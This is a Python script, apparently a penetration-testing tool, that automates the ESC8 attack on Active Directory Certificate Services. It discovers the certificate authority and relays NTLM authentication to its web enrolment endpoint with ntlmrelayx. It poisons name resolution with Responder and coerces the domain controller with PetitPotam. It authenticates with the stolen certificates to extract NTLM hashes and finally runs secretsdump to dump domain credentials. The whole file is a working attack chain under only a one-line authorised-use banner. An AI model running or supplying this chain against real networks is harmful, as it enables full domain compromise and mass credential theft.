import subprocess
import time
import logging
import re
import sys
import shutil
import ipaddress
from pathlib import Path
from tqdm import tqdm
import os

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    INFO = '\033[94m'
    SUCCESS = '\033[92m'
    WARNING = '\033[93m'
    ERROR = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Paths to tools, adjust as necessary
TOOL_PATHS = {
    'ntlmrelayx': 'ntlmrelayx.py',
    'responder': 'responder',
    'certipy': 'certipy',
    'petitpotam': '/root/tools/PetitPotam/PetitPotam.py',
    'secretsdump': '/root/.local/bin/secretsdump.py'
}

# Configure dual logging (console + file)
class DualLogger:
    """Custom logger that outputs to both file and console with formatting."""

    def __init__(self, log_file='automation.log'):
        self.logger = logging.getLogger('ESC8Automation')
        self.logger.setLevel(logging.DEBUG)

        # File handler - detailed logging
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(logging.DEBUG)
        file_formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        file_handler.setFormatter(file_formatter)

        # Console handler - user-friendly output
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setLevel(logging.INFO)
        console_formatter = logging.Formatter('%(message)s')
        console_handler.setFormatter(console_formatter)

        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)

    def info(self, msg):
        self.logger.info(f"{Colors.INFO}[INFO]{Colors.ENDC} {msg}")

    def success(self, msg):
        self.logger.info(f"{Colors.SUCCESS}[SUCCESS]{Colors.ENDC} {msg}")

    def warning(self, msg):
        self.logger.warning(f"{Colors.WARNING}[WARNING]{Colors.ENDC} {msg}")

    def error(self, msg):
        self.logger.error(f"{Colors.ERROR}[ERROR]{Colors.ENDC} {msg}")

    def debug(self, msg):
        self.logger.debug(msg)

# Initialize logger
logger = DualLogger()

def validate_ip_address(ip_string):
    """
    Validate IP address format.

    Parameters:
    ip_string (str): IP address string to validate.

    Returns:
    bool: True if valid, False otherwise.
    """
    try:
        ipaddress.ip_address(ip_string)
        return True
    except ValueError:
        return False

def validate_domain_name(domain):
    """
    Validate domain name format.

    Parameters:
    domain (str): Domain name to validate.

    Returns:
    bool: True if valid, False otherwise.
    """
    # Basic validation for domain name
    pattern = r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
    return bool(re.match(pattern, domain))

def check_tool_availability():
    """
    Check if all required tools are available in the system.

    Returns:
    tuple: (bool, list) - Success status and list of missing tools.
    """
    logger.info("Checking tool availability...")
    missing_tools = []

    for tool_name, tool_path in TOOL_PATHS.items():
        # Check if it's an absolute path
        if os.path.isabs(tool_path):
            if not Path(tool_path).exists():
                missing_tools.append(f"{tool_name} (expected at: {tool_path})")
                logger.error(f"Tool not found: {tool_name} at {tool_path}")
        else:
            # Check if tool is in PATH
            if not shutil.which(tool_path):
                missing_tools.append(f"{tool_name} (command: {tool_path})")
                logger.error(f"Tool not found in PATH: {tool_path}")

    if missing_tools:
        logger.error("Missing required tools:")
        for tool in missing_tools:
            logger.error(f"  - {tool}")
        return False, missing_tools

    logger.success("All required tools are available")
    return True, []

def run_command(command, step_desc, sleep_time=0, is_background=False, capture_output=False, timeout=300):
    """
    Run a shell command with optional sleep time, output capture, and error handling.

    Parameters:
    command (list): The command to run as a list of arguments.
    step_desc (str): Description of the current step for logging purposes.
    sleep_time (int): Time to sleep after running the command.
    is_background (bool): Whether the command should run in the background.
    capture_output (bool): Whether to capture the command output.
    timeout (int): Command timeout in seconds (default: 300).

    Returns:
    subprocess.Popen or str or None: Process handle if running in background,
                                     captured output if capture_output is True,
                                     None otherwise or on error.
    """
    try:
        logger.info(f"Starting: {step_desc}")
        logger.debug(f"Executing command: {' '.join(command)}")

        if is_background:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            time.sleep(sleep_time)
            logger.debug(f"Background process started with PID: {process.pid}")
            return process

        elif capture_output:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            try:
                stdout, stderr = process.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                logger.error(f"Command timed out after {timeout} seconds: {step_desc}")
                logger.error("Consider increasing the timeout or checking network connectivity")
                return None

            time.sleep(sleep_time)

            if process.returncode != 0:
                logger.error(f"Command failed: {step_desc}")
                logger.error(f"Return code: {process.returncode}")
                if stderr:
                    logger.debug(f"STDERR: {stderr}")
                    # Extract meaningful error from stderr
                    error_lines = stderr.strip().split('\n')
                    logger.error(f"Error details: {error_lines[-1] if error_lines else 'No details available'}")
                return None

            logger.success(f"Completed: {step_desc}")
            return stdout

        else:
            result = subprocess.run(
                command,
                check=True,
                timeout=timeout,
                capture_output=True,
                text=True
            )
            time.sleep(sleep_time)
            logger.success(f"Completed: {step_desc}")
            return result.stdout

    except subprocess.CalledProcessError as e:
        logger.error(f"Command execution failed: {step_desc}")
        logger.error(f"Return code: {e.returncode}")
        if e.stderr:
            logger.debug(f"STDERR: {e.stderr}")
        logger.error("Check the log file for detailed error information")
        return None

    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out after {timeout} seconds: {step_desc}")
        logger.error("This may indicate network issues or unresponsive target")
        return None

    except FileNotFoundError as e:
        logger.error(f"Tool not found: {command[0]}")
        logger.error(f"Ensure the tool is installed and the path is correct")
        logger.debug(f"Exception: {e}")
        return None

    except PermissionError as e:
        logger.error(f"Permission denied when executing: {command[0]}")
        logger.error("Try running the script with appropriate permissions (sudo)")
        logger.debug(f"Exception: {e}")
        return None

    except Exception as e:
        logger.error(f"Unexpected error during: {step_desc}")
        logger.error(f"Exception type: {type(e).__name__}")
        logger.error(f"Exception message: {str(e)}")
        logger.debug(f"Full exception: {e}", exc_info=True)
        return None

def wait_for_pfx(process, step_desc, timeout=120):
    """
    Wait for a specific output indicating the PFX certificate has been written.

    Parameters:
    process (subprocess.Popen): The process handle to read output from.
    step_desc (str): Description of the current step for logging purposes.
    timeout (int): Maximum time to wait in seconds (default: 120).

    Returns:
    bool: True if the PFX certificate is found, False otherwise.
    """
    try:
        logger.info(f"Waiting for PFX certificate generation (timeout: {timeout}s)...")
        start_time = time.time()

        while True:
            # Check timeout
            if time.time() - start_time > timeout:
                logger.error(f"Timeout waiting for PFX certificate after {timeout} seconds")
                logger.error("This may indicate:")
                logger.error("  - ADCS HTTP endpoint is not vulnerable or accessible")
                logger.error("  - No authentication attempts were relayed")
                logger.error("  - Incorrect CA server address")
                return False

            output = process.stdout.readline()

            # Process terminated
            if output == '' and process.poll() is not None:
                logger.error("Process terminated before PFX certificate was generated")
                logger.error(f"Process exit code: {process.returncode}")
                # Try to read any stderr
                stderr_output = process.stderr.read()
                if stderr_output:
                    logger.debug(f"Process stderr: {stderr_output}")
                return False

            # Log output for debugging
            if output:
                logger.debug(f"Process output: {output.strip()}")

            # Check for certificate generation
            if "Writing PKCS#12 certificate to" in output:
                cert_match = re.search(r"Writing PKCS#12 certificate to (.+)", output)
                if cert_match:
                    cert_file = cert_match.group(1).strip()
                    logger.success(f"PFX certificate generated: {cert_file}")
                    # Verify file exists
                    if Path(cert_file).exists():
                        logger.success(f"Certificate file verified: {cert_file}")
                        return True
                    else:
                        logger.warning(f"Certificate file not found: {cert_file}")

            time.sleep(0.5)

    except KeyboardInterrupt:
        logger.warning("PFX wait interrupted by user")
        return False

    except Exception as e:
        logger.error(f"Unexpected error while waiting for PFX")
        logger.error(f"Exception: {type(e).__name__}: {str(e)}")
        logger.debug(f"Full exception: {e}", exc_info=True)
        return False

def get_user_input():
    """
    Prompt user for required input with validation.

    Returns:
    dict or None: Dictionary containing validated user inputs, or None if validation fails.
    """
    print(f"\n{Colors.HEADER}{Colors.BOLD}ESC8 ADCS Exploitation Tool{Colors.ENDC}")
    print(f"{Colors.WARNING}For authorized security testing only{Colors.ENDC}\n")

    inputs = {}

    # Get and validate Domain Controller IP
    while True:
        inputs['dc_ip'] = input(f"{Colors.INFO}Enter the Domain Controller IP address: {Colors.ENDC}").strip()
        if validate_ip_address(inputs['dc_ip']):
            logger.debug(f"Valid DC IP: {inputs['dc_ip']}")
            break
        logger.error("Invalid IP address format. Please enter a valid IPv4 or IPv6 address.")

    # Get and validate attacker IP
    while True:
        inputs['attacker_ip'] = input(f"{Colors.INFO}Enter your IP address: {Colors.ENDC}").strip()
        if validate_ip_address(inputs['attacker_ip']):
            logger.debug(f"Valid attacker IP: {inputs['attacker_ip']}")
            break
        logger.error("Invalid IP address format. Please enter a valid IPv4 or IPv6 address.")

    # Get and validate domain name
    while True:
        inputs['domain'] = input(f"{Colors.INFO}Enter the domain name (e.g., domain.local): {Colors.ENDC}").strip()
        if validate_domain_name(inputs['domain']):
            logger.debug(f"Valid domain name: {inputs['domain']}")
            break
        logger.error("Invalid domain name format. Please enter a valid domain (e.g., contoso.local).")

    # Get domain user
    inputs['domain_user'] = input(
        f"{Colors.INFO}Enter the domain user name (e.g., jsmith@domain.local): {Colors.ENDC}"
    ).strip()
    if not inputs['domain_user']:
        logger.error("Domain user cannot be empty")
        return None

    # Get domain password (note: visible in terminal, consider using getpass for production)
    inputs['domain_password'] = input(
        f"{Colors.INFO}Enter the domain user's password: {Colors.ENDC}"
    ).strip()
    if not inputs['domain_password']:
        logger.error("Domain password cannot be empty")
        return None

    logger.success("All inputs validated successfully\n")
    return inputs


def main():
    """Main execution function with comprehensive error handling."""
    processes_to_cleanup = []

    try:
        # Print banner
        print(f"\n{Colors.BOLD}{'=' * 70}{Colors.ENDC}")
        print(f"{Colors.HEADER}{Colors.BOLD}ESC8 ADCS Exploitation Automation Tool{Colors.ENDC}")
        print(f"{Colors.BOLD}{'=' * 70}{Colors.ENDC}\n")

        # Check tool availability
        tools_ok, missing = check_tool_availability()
        if not tools_ok:
            logger.error("\nCannot proceed without required tools.")
            logger.error("Please install missing tools and update paths in the script.")
            return 1

        # Get and validate user inputs
        user_inputs = get_user_input()
        if not user_inputs:
            logger.error("Failed to get valid user inputs")
            return 1

        domain_controller_ip = user_inputs['dc_ip']
        your_ip = user_inputs['attacker_ip']
        domain_name = user_inputs['domain']
        domain_user = user_inputs['domain_user']
        domain_password = user_inputs['domain_password']

        # Step 0: Query CA Authority information using Certipy
        logger.info("\n" + "=" * 70)
        logger.info("STEP 0: Discovering Certificate Authority")
        logger.info("=" * 70)

        certipy_ca_cmd = [
            TOOL_PATHS['certipy'], "find",
            "-u", domain_user,
            "-p", domain_password,
            "-dc-ip", domain_controller_ip,
            "-stdout"
        ]

        certipy_ca_output = run_command(
            certipy_ca_cmd,
            "Query CA Authority using Certipy",
            capture_output=True,
            timeout=120
        )

        if not certipy_ca_output:
            logger.error("Failed to query CA Authority")
            logger.error("Possible causes:")
            logger.error("  - Invalid credentials")
            logger.error("  - Network connectivity issues")
            logger.error("  - Domain Controller unreachable")
            return 1

        # Extract CA Authority information
        ca_authority_ip = None
        ca_match = re.search(r"DNS Name\s+:\s+(\S+)", certipy_ca_output)
        if ca_match:
            ca_authority_ip = ca_match.group(1)
            logger.success(f"Certificate Authority discovered: {ca_authority_ip}")
        else:
            logger.error("Failed to extract CA Authority from Certipy output")
            logger.error("This may indicate:")
            logger.error("  - No CA servers in the domain")
            logger.error("  - Insufficient permissions")
            logger.debug(f"Certipy output: {certipy_ca_output}")
            return 1

        # Progress bar setup
        logger.info("\n" + "=" * 70)
        logger.info("Starting ESC8 Attack Chain")
        logger.info("=" * 70 + "\n")

        steps = [
            "Start ntlmrelayx.py (Initial Relay)",
            "Start Responder to Poison Responses",
            "Run Certipy to Authenticate and Extract Username/Hash",
            "Stop Responder",
            "Run ntlmrelayx.py with DomainController Template",
            "Coerce Domain Controller Authentication with PetitPotam",
            "Extract DC Credentials with Certipy",
            "Dump Secrets with secretsdump.py"
        ]

        with tqdm(total=len(steps), desc="Attack Progress", unit="step", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}') as pbar:
            # Step 1: Start ntlmrelayx.py for initial relay
            logger.info(f"\nSTEP 1: {steps[0]}")
            logger.info("-" * 70)

            ntlmrelayx_cmd = [
                TOOL_PATHS['ntlmrelayx'],
                "-t", f"http://{ca_authority_ip}/certsrv/certfnsh.asp",
                "-smb2support", "--adcs", "-of", "logs", "--raw-port", "6667"
            ]

            ntlmrelayx_process = subprocess.Popen(
                ntlmrelayx_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            processes_to_cleanup.append(ntlmrelayx_process)
            logger.debug(f"ntlmrelayx started with PID: {ntlmrelayx_process.pid}")
            time.sleep(10)
            pbar.update(1)

            # Wait for the PFX certificate to be generated before proceeding
            if not wait_for_pfx(ntlmrelayx_process, steps[0], timeout=180):
                logger.error("Failed to obtain PFX certificate")
                logger.error("Attack cannot continue without certificate")
                return 1

            # Step 2: Start Responder in a new terminal window
            logger.info(f"\nSTEP 2: {steps[1]}")
            logger.info("-" * 70)

            responder_cmd = [TOOL_PATHS['responder'], "-I", "eth0", "-vwF"]
            os.system(f'gnome-terminal -- bash -c "{" ".join(responder_cmd)}; exec bash"')
            logger.success("Responder started in new terminal")
            time.sleep(5)
            pbar.update(1)

            # Step 3: Run Certipy to authenticate and extract username/NTLM hash
            logger.info(f"\nSTEP 3: {steps[2]}")
            logger.info("-" * 70)

            # Check if certificate file exists
            admin_cert_path = "ADMINISTRATOR.pfx"
            if not Path(admin_cert_path).exists():
                logger.error(f"Certificate file not found: {admin_cert_path}")
                logger.error("Ensure the previous step completed successfully")
                return 1

            certipy_cmd = [
                TOOL_PATHS['certipy'], "auth",
                "-pfx", admin_cert_path,
                "-dc-ip", domain_controller_ip
            ]

            certipy_output = run_command(
                certipy_cmd,
                "Authenticate with administrator certificate",
                capture_output=True,
                timeout=120
            )

            if not certipy_output:
                logger.error("Failed to authenticate with certificate")
                return 1

            logger.debug(f"Certipy authentication output: {certipy_output}")

            # Extract username and NTLM hash from Certipy output
            username_match = re.search(r"Trying to retrieve NT hash for '([^']+)'", certipy_output)
            hash_match = re.search(r"Got hash for '([^']+)': ([a-fA-F0-9:]+)", certipy_output)

            if not (username_match and hash_match):
                logger.error("Failed to extract credentials from Certipy output")
                logger.error("Certificate authentication may have failed")
                logger.debug(f"Output: {certipy_output}")
                return 1

            username = username_match.group(1)
            ntlm_hash = hash_match.group(2)
            logger.success(f"Extracted Username: {username}")
            logger.success(f"Extracted NTLM Hash: {ntlm_hash[:16]}...")
            pbar.update(1)

            # Step 4: Stop Responder
            logger.info(f"\nSTEP 4: {steps[3]}")
            logger.info("-" * 70)

            os.system("pkill -f responder")
            logger.success("Responder terminated")
            time.sleep(2)
            pbar.update(1)

            # Step 5: Run ntlmrelayx.py with DomainController template
            logger.info(f"\nSTEP 5: {steps[4]}")
            logger.info("-" * 70)

            # Clean up previous ntlmrelayx
            os.system("pkill -f ntlmrelayx.py")
            time.sleep(5)

            ntlmrelayx_dc_cmd = [
                TOOL_PATHS['ntlmrelayx'],
                "-t", f"http://{ca_authority_ip}/certsrv/certfnsh.asp",
                "-smb2support", "--adcs", "--raw-port", "6667", "--template", "DomainController"
            ]
            os.system(f'gnome-terminal -- bash -c "{" ".join(ntlmrelayx_dc_cmd)}; exec bash"')
            logger.success("ntlmrelayx started with DomainController template")
            time.sleep(10)
            pbar.update(1)

            # Step 6: Coerce Domain Controller authentication with PetitPotam
            logger.info(f"\nSTEP 6: {steps[5]}")
            logger.info("-" * 70)

            petitpotam_cmd = [
                "python3", TOOL_PATHS['petitpotam'],
                "-u", username,
                "-hashes", f"{ntlm_hash}",
                "-d", domain_name,
                "-dc-ip", domain_controller_ip,
                your_ip, domain_controller_ip
            ]

            petitpotam_result = run_command(
                petitpotam_cmd,
                "Coerce DC authentication with PetitPotam",
                sleep_time=15,
                timeout=180
            )

            if petitpotam_result is None:
                logger.warning("PetitPotam may have failed, but continuing...")
            else:
                logger.success("PetitPotam coercion completed")

            pbar.update(1)

            # Step 7: Run Certipy to authenticate and extract DC name/NTLM hash
            logger.info(f"\nSTEP 7: {steps[6]}")
            logger.info("-" * 70)

            # Wait a bit and check for DC certificate
            time.sleep(5)
            dc_cert_path = "DC1$.pfx"

            # Try multiple common naming patterns
            possible_cert_names = ["DC1$.pfx", "DC$.pfx", "DC01$.pfx"]
            found_cert = None

            for cert_name in possible_cert_names:
                if Path(cert_name).exists():
                    found_cert = cert_name
                    logger.success(f"Found DC certificate: {cert_name}")
                    break

            if not found_cert:
                logger.error("DC certificate not found")
                logger.error("PetitPotam coercion may have failed")
                logger.error("Check that:")
                logger.error("  - ntlmrelayx is still running")
                logger.error("  - ADCS is accessible")
                logger.error("  - Network connectivity is stable")
                return 1

            certipy_dc_cmd = [
                TOOL_PATHS['certipy'], "auth",
                "-pfx", found_cert,
                "-dc-ip", domain_controller_ip
            ]

            certipy_dc_output = run_command(
                certipy_dc_cmd,
                "Authenticate with DC certificate",
                capture_output=True,
                timeout=120
            )

            if not certipy_dc_output:
                logger.error("Failed to authenticate with DC certificate")
                return 1

            logger.debug(f"Certipy DC authentication output: {certipy_dc_output}")

            # Extract DC name and NTLM hash from Certipy output
            dc_name_match = re.search(r"Trying to retrieve NT hash for '([^']+)'", certipy_dc_output)
            dc_hash_match = re.search(r"Got hash for '([^']+)': ([a-fA-F0-9:]+)", certipy_dc_output)

            if not (dc_name_match and dc_hash_match):
                logger.error("Failed to extract DC credentials from Certipy output")
                logger.debug(f"Output: {certipy_dc_output}")
                return 1

            dc_name = dc_name_match.group(1)
            dc_ntlm_hash = dc_hash_match.group(2)
            logger.success(f"Extracted DC Name: {dc_name}")
            logger.success(f"Extracted DC NTLM Hash: {dc_ntlm_hash[:16]}...")
            pbar.update(1)

            # Step 8: Dump secrets with secretsdump.py
            logger.info(f"\nSTEP 8: {steps[7]}")
            logger.info("-" * 70)

            secretsdump_cmd = [
                TOOL_PATHS['secretsdump'],
                f"{domain_name}/{dc_name}@{domain_controller_ip}",
                "-hashes", f"{dc_ntlm_hash}",
                "-just-dc-ntlm"
            ]

            logger.info("Dumping domain secrets...")
            secretsdump_result = run_command(
                secretsdump_cmd,
                "Dump domain secrets",
                timeout=300
            )

            if secretsdump_result:
                logger.success("\n" + "=" * 70)
                logger.success("ESC8 Attack Chain Completed Successfully!")
                logger.success("=" * 70)
                logger.success("Domain secrets have been dumped")
                logger.success(f"Check the output above for credentials")
            else:
                logger.error("Failed to dump domain secrets")
                return 1

            pbar.update(1)

        return 0

    except KeyboardInterrupt:
        logger.warning("\n\nAttack interrupted by user (Ctrl+C)")
        return 130

    except Exception as e:
        logger.error(f"\n\nUnexpected error occurred: {type(e).__name__}")
        logger.error(f"Error message: {str(e)}")
        logger.debug("Full exception:", exc_info=True)
        return 1

    finally:
        # Cleanup processes
        logger.info("\n" + "-" * 70)
        logger.info("Cleaning up processes...")
        logger.info("-" * 70)

        # Kill any remaining processes
        for process in processes_to_cleanup:
            try:
                if process.poll() is None:  # Process still running
                    process.terminate()
                    process.wait(timeout=5)
                    logger.debug(f"Terminated process PID: {process.pid}")
            except Exception as e:
                logger.debug(f"Error terminating process: {e}")

        # Kill any stray processes
        os.system("pkill -f ntlmrelayx.py 2>/dev/null")
        os.system("pkill -f responder 2>/dev/null")

        logger.info("Cleanup complete")
        logger.info("Check automation.log for detailed execution history\n")

if __name__ == "__main__":
    sys.exit(main())
